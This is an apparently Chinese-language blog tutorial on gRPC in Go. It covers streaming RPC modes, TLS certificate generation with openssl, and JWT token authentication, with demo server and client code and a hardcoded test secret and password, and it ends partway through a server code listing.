<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials/insecure&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/8</span></span><br><span class="line"><span class="comment">  @desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	conn, err := grpc.Dial(<span class="string">&quot;0.0.0.0:8999&quot;</span>, grpc.WithTransportCredentials(insecure.NewCredentials()))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;did not connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	c := pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Contact the server and print out its response.</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	r, err := c.SayHello(ctx, &amp;pb.HelloRequest&#123;</span><br><span class="line">		Name: <span class="string">&quot;yhy&quot;</span>,</span><br><span class="line">		Id:   <span class="number">1</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;could not greet: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Printf(<span class="string">&quot;Greeting: %s&quot;</span>, r.GetMessage())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="service-方法的4-种请求和响应模式类型"><a href="#service-方法的4-种请求和响应模式类型" class="headerlink" title="service 方法的4 种请求和响应模式类型"></a>service 方法的4 种请求和响应模式类型</h3><ul>
<li>一个_简单的 RPC_，其中客户端使用存根向服务器发送请求并等待响应返回，就像正常的函数调用一样。</li>
</ul>
<p>前面的<code>SayHello</code>方法 就是一个简单RPC</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rpc</span> GetFeature(Point) <span class="keyword">returns</span> (Feature) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><em>服务器端流式 RPC</em> ，客户端发送请求到服务器，拿到一个流去读取返回的消息序列。 客户端读取返回的流，直到里面没有任何消息。从例子中可以看出，通过在 响应 类型前插入<code>stream</code>关键字，可以指定一个服务器端的流方法。</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Obtains the Features available within the given Rectangle.  Results are</span></span><br><span class="line"><span class="comment">// streamed rather than returned at once (e.g. in a response message with a</span></span><br><span class="line"><span class="comment">// repeated field), as the rectangle may cover a large area and contain a</span></span><br><span class="line"><span class="comment">// huge number of features.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListFeatures(Rectangle) <span class="keyword">returns</span> (stream Feature) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一个 客户端流式 RPC ， 客户端写入一个消息序列并将其发送到服务器，同样也是使用流。一旦客户端完成写入消息，它等待服务器完成读取返回它的响应。通过在 请求 类型前指定 <code>stream</code> 关键字来指定一个客户端的流方法。</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Accepts a stream of Points on a route being traversed, returning a</span></span><br><span class="line"><span class="comment">// RouteSummary when traversal is completed.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> RecordRoute(stream Point) <span class="keyword">returns</span> (RouteSummary) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一个 双向流式 RPC 是双方使用读写流去发送一个消息序列。两个流独立操作，因此客户端和服务器可以以任意喜欢的顺序读写：比如， 服务器可以在写入响应前等待接收所有的客户端消息，或者可以交替的读取和写入消息，或者其他读写的组合。 每个流中的消息顺序被预留。你可以通过在请求和响应前加 <code>stream</code> 关键字去制定方法的类型。</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Accepts a stream of RouteNotes sent while a route is being traversed,</span></span><br><span class="line"><span class="comment">// while receiving other RouteNotes (e.g. from other users).</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> RouteChat(stream RouteNote) <span class="keyword">returns</span> (stream RouteNote) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h2><p>gRPC 底层是基于 HTTP&#x2F;2 协议的，HTTP 本身不带任何加密传输功能，基于 SSL 的 HTTPS 协议才是加密传输。gRPC 使用了 HTTP&#x2F;2 协议但是并未使用 HTTPS，即少了加密传输的部分。<br>对于加密传输的部分 gRPC 将它抽出来作为一个组件，可以由用户自由选择。gRPC 内默认提供了两种 内置的认证方式：</p>
<ul>
<li>基于 CA 证书的 SSL&#x2F;TLS 认证方式；</li>
<li>基于 Token 的认证方式。</li>
</ul>
<p>gRPC 中的连接类型一共有以下 3 种：</p>
<ul>
<li>insecure connection：不使用 TLS 加密；</li>
<li>server-side TLS：仅服务端 TLS 加密；</li>
<li>mutual TLS：客户端、服务端都使用 TLS 加密。</li>
</ul>
<h3 id="基于-TLS-x2F-SSL-认证"><a href="#基于-TLS-x2F-SSL-认证" class="headerlink" title="基于 TLS&#x2F;SSL 认证"></a>基于 TLS&#x2F;SSL 认证</h3><h4 id="1-ca根证书生成"><a href="#1-ca根证书生成" class="headerlink" title="1.ca根证书生成"></a>1.ca根证书生成</h4><p>新建ca.conf,填入以下内容：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[ req ]</span><br><span class="line">default_bits       = <span class="number">4096</span></span><br><span class="line">distinguished_name = req_distinguished_name</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line">countryName                 = Country Name (<span class="number">2</span> letter code)</span><br><span class="line">countryName_default         = CN</span><br><span class="line">stateOrProvinceName         = State or Province Name (full name)</span><br><span class="line">stateOrProvinceName_default = JiangSu</span><br><span class="line">localityName                = Locality Name (eg, city)</span><br><span class="line">localityName_default        = NanJing</span><br><span class="line">organizationName            = Organization Name (eg, company)</span><br><span class="line">organizationName_default    = Step</span><br><span class="line">commonName                  = CommonName (e.g. server FQDN or YOUR name)</span><br><span class="line">commonName_max              = <span class="number">64</span></span><br><span class="line">commonName_default          = XXX(自定义)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成ca.key：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out ca.key <span class="number">4096</span></span><br></pre></td></tr></table></figure>

<p>生成ca.csr：(直接回车，采用default默认配置值)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl req -<span class="built_in">new</span> -sha256 -out ca.csr -key ca.key -config ca.conf</span><br></pre></td></tr></table></figure>
<p>生成ca.crt：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -days <span class="number">3650</span> -in ca.csr -signkey ca.key -out ca.crt</span><br></pre></td></tr></table></figure>
<h4 id="2-server证书生成"><a href="#2-server证书生成" class="headerlink" title="2.server证书生成"></a>2.server证书生成</h4><p>新建server.conf,填入以下内容：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[ req ]</span><br><span class="line">default_bits       = <span class="number">2048</span></span><br><span class="line">distinguished_name = req_distinguished_name</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line">countryName                 = Country Name (<span class="number">2</span> letter code)</span><br><span class="line">countryName_default         = CN</span><br><span class="line">stateOrProvinceName         = State or Province Name (full name)</span><br><span class="line">stateOrProvinceName_default = JiangSu</span><br><span class="line">localityName                = Locality Name (eg, city)</span><br><span class="line">localityName_default        = NanJing</span><br><span class="line">organizationName            = Organization Name (eg, company)</span><br><span class="line">organizationName_default    = Step</span><br><span class="line">commonName                  = CommonName (e.g. server FQDN or YOUR name)</span><br><span class="line">commonName_max              = <span class="number">64</span></span><br><span class="line">commonName_default          = XXX(自定义,客户端需要此字段做匹配)</span><br><span class="line">[ req_ext ]</span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line">[alt_names]</span><br><span class="line">DNS<span class="number">.1</span>   = XXX(自定义)</span><br><span class="line">IP      = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成server.key：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out server.key <span class="number">2048</span></span><br></pre></td></tr></table></figure>
<p>生成server.csr：(直接回车，采用default默认配置值)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl req -<span class="built_in">new</span> -sha256 -out server.csr -key server.key -config server.conf</span><br></pre></td></tr></table></figure>
<p>生成server.crt：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -days <span class="number">3650</span> -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.pem -extensions req_ext -extfile server.conf</span><br></pre></td></tr></table></figure>
<p>最终只需要 <code>server.pem</code>和 <code>server.key</code>两个文件</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// server is used to implement helloworld.GreeterServer.</span></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">	pb.UnimplementedGreeterServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须实现 SayHello 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// SayHello implements helloworld.GreeterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="type">error</span>) &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;Received: %v %d&quot;</span>, in.GetName(), in.GetId())</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.HelloReply&#123;Message: fmt.Sprintf(<span class="string">&quot;Hello %s %d\n&quot;</span>, in.GetName(), in.GetId())&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LoggingInterceptor 拦截器 - 打印日志</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoggingInterceptor</span><span class="params">(ctx context.Context, req <span class="keyword">interface</span>&#123;&#125;, info *grpc.UnaryServerInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">	handler grpc.UnaryHandler)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;gRPC method: %s, %v&quot;</span>, info.FullMethod, req)</span><br><span class="line">	resp, err := handler(ctx, req)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;gRPC method: %s, %v&quot;</span>, info.FullMethod, resp)</span><br><span class="line">	<span class="keyword">return</span> resp, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/8</span></span><br><span class="line"><span class="comment">  @desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 监听</span></span><br><span class="line">	lis, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8999&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;failed to listen: %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// TLS认证</span></span><br><span class="line">	creds, err := credentials.NewServerTLSFromFile(<span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.pem&quot;</span>, <span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.key&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		grpclog.Fatalf(<span class="string">&quot;Failed to generate credentials %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建gRPC服务器,开启TLS认证</span></span><br><span class="line">	s := grpc.NewServer(grpc.Creds(creds))</span><br><span class="line">	<span class="comment">// 在gRPC服务端注册服务</span></span><br><span class="line">	pb.RegisterGreeterServer(s, &amp;server&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;server listening at %v&quot;</span>, lis.Addr())</span><br><span class="line">	err = s.Serve(lis)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/8</span></span><br><span class="line"><span class="comment">  @desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// TLS认证</span></span><br><span class="line">	creds, err := credentials.NewClientTLSFromFile(<span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.pem&quot;</span>, <span class="string">&quot;*.yhy.com&quot;</span>) <span class="comment">// 指定的 DNS.1  </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		grpclog.Fatalf(<span class="string">&quot;Failed to generate credentials %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	conn, err := grpc.Dial(<span class="string">&quot;0.0.0.0:8999&quot;</span>, grpc.WithTransportCredentials(creds))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;did not connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	c := pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Contact the server and print out its response.</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	r, err := c.SayHello(ctx, &amp;pb.HelloRequest&#123;</span><br><span class="line">		Name: <span class="string">&quot;yhy&quot;</span>,</span><br><span class="line">		Id:   <span class="number">1</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;could not greet: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Printf(<span class="string">&quot;Greeting: %s&quot;</span>, r.GetMessage())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样就可以对客户端和服务端之间交互的所有数据进行加密。</p>
<h3 id="Token认证"><a href="#Token认证" class="headerlink" title="Token认证"></a>Token认证</h3><p>客户端发请求时，添加Token到上下文context.Context中，服务器接收到请求，先从上下文中获取Token验证，验证通过才进行下一步处理。<br>gRPC 中默认定义了 <code>PerRPCCredentials</code>，是提供用于自定义认证的接口，它的作用是将所需的安全认证信息添加到每个RPC方法的上下文中。其包含 2 个方法：</p>
<ul>
<li>GetRequestMetadata：获取当前请求认证所需的元数据</li>
<li>RequireTransportSecurity：是否需要基于 TLS 认证进行安全传输<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> PerRPCCredentials <span class="keyword">interface</span> &#123;</span><br><span class="line">    GetRequestMetadata(ctx context.Context, uri ...<span class="type">string</span>) (<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="type">error</span>)</span><br><span class="line">    RequireTransportSecurity() <span class="type">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
使用 token 认证必须实现这两个方法。<br>这里以 <code>JWT</code>作为 Token 认证为例，新建<code>jwt.go</code>文件<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/dgrijalva/jwt-go&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/metadata&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/9</span></span><br><span class="line"><span class="comment">  @desc: https://www.cnblogs.com/rickiyang/p/14989375.html</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> JwtSecret = <span class="string">&quot;yhy&quot;</span> <span class="comment">// jwt 秘钥</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateToken</span><span class="params">(userName <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	claims := jwt.MapClaims&#123;</span><br><span class="line">		<span class="string">&quot;iss&quot;</span>:      <span class="string">&quot;test&quot;</span>,</span><br><span class="line">		<span class="string">&quot;aud&quot;</span>:      <span class="string">&quot;test&quot;</span>,</span><br><span class="line">		<span class="string">&quot;nbf&quot;</span>:      time.Now().Unix(),</span><br><span class="line">		<span class="string">&quot;exp&quot;</span>:      time.Now().Add(<span class="number">24</span> * time.Hour).Unix(), <span class="comment">// 过期时间</span></span><br><span class="line">		<span class="string">&quot;sub&quot;</span>:      <span class="string">&quot;user&quot;</span>,</span><br><span class="line">		<span class="string">&quot;username&quot;</span>: userName,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// sha256</span></span><br><span class="line">	tokenClaims := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">	token, err := tokenClaims.SignedString([]<span class="type">byte</span>(JwtSecret))</span><br><span class="line">	<span class="keyword">return</span> token, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AuthToken 自定义认证</span></span><br><span class="line"><span class="keyword">type</span> AuthToken <span class="keyword">struct</span> &#123;</span><br><span class="line">	Token <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须实现以下两个方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GetRequestMetadata 获取当前请求认证所需的元数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c AuthToken)</span></span> GetRequestMetadata(ctx context.Context, uri ...<span class="type">string</span>) (<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;authorization&quot;</span>: c.Token,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RequireTransportSecurity 是否需要基于 TLS 认证进行安全传输</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c AuthToken)</span></span> RequireTransportSecurity() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Claims defines the struct containing the token claims.</span></span><br><span class="line"><span class="keyword">type</span> Claims <span class="keyword">struct</span> &#123;</span><br><span class="line">	jwt.StandardClaims</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Username defines the identity of the user.</span></span><br><span class="line">	Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step1. 从 context 的 metadata 中，取出 token</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getTokenFromContext</span><span class="params">(ctx context.Context)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	md, ok := metadata.FromIncomingContext(ctx)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;Err NoMetadata In Context&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// md 的类型是 type MD map[string][]string</span></span><br><span class="line">	token, ok := md[<span class="string">&quot;authorization&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !ok || <span class="built_in">len</span>(token) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;Err NoAuthorization In Metadata&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 因此，token 是一个字符串数组，我们只用了 token[0]</span></span><br><span class="line">	<span class="keyword">return</span> token[<span class="number">0</span>], <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(ctx context.Context)</span></span> (username <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	tokenStr, err := getTokenFromContext(ctx)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;get token from context error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> clientClaims Claims</span><br><span class="line">	token, err := jwt.ParseWithClaims(tokenStr, &amp;clientClaims, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> token.Header[<span class="string">&quot;alg&quot;</span>] != <span class="string">&quot;HS256&quot;</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(<span class="string">&quot;ErrInvalidAlgorithm&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> []<span class="type">byte</span>(JwtSecret), <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !token.Valid &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> clientClaims.Username, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<code>helloworld.proto</code>增加以下代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 远程调用定义的消息类型</span></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;</span><br><span class="line">  <span class="comment">// 服务端必须实现该方法</span></span><br><span class="line">  rpc Login (LoginRequest) returns (LoginResp) &#123;&#125; 	 <span class="comment">//新增的 login 方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息, 指定字段类型，并为字段分配一个唯一的编号</span></span><br><span class="line">message LoginRequest&#123;</span><br><span class="line">  <span class="type">string</span> username = <span class="number">1</span>;</span><br><span class="line">  <span class="type">string</span> password = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">message LoginResp&#123;</span><br><span class="line">  <span class="type">string</span> status = <span class="number">1</span>;</span><br><span class="line">  <span class="type">string</span> token = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行 <code>protoc  --go_out=helloworld --go-grpc_out=helloworld helloworld/helloworld.proto</code>重新生成对应的文件<br><code>server.go </code>实现 <code>Login</code>方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> Login(ctx context.Context, request *pb.LoginRequest) (resp *pb.LoginResp, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> request.Username == <span class="string">&quot;yhy&quot;</span> &amp;&amp; request.Password == <span class="string">&quot;123456&quot;</span> &#123;</span><br><span class="line">		jwtToken, err := token.GenerateToken(request.Username)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> &amp;pb.LoginResp&#123;Status: <span class="string">&quot;200&quot;</span>, Token: jwtToken&#125;, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.LoginResp&#123;Status: <span class="string">&quot;401&quot;</span>, Token: <span class="string">&quot;&quot;</span>&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后服务端代码中，每个服务的方法都需要添加<code>CheckAuth(ctx)</code>来验证Token，这样十分麻烦。这里使用gRPC拦截器，能够很好地解决这个问题。gRPC拦截器功能类似中间件，拦截器收到请求后，先进行一些操作，然后才进入服务的代码处理。<br>服务端完整代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/8</span></span><br><span class="line"><span class="comment">  @desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">	<span class="string">&quot;grpcTest/token&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// server is used to implement helloworld.GreeterServer.</span></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">	pb.UnimplementedGreeterServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须实现 SayHello 方法</span></span><br><span class="line"></span><br><span 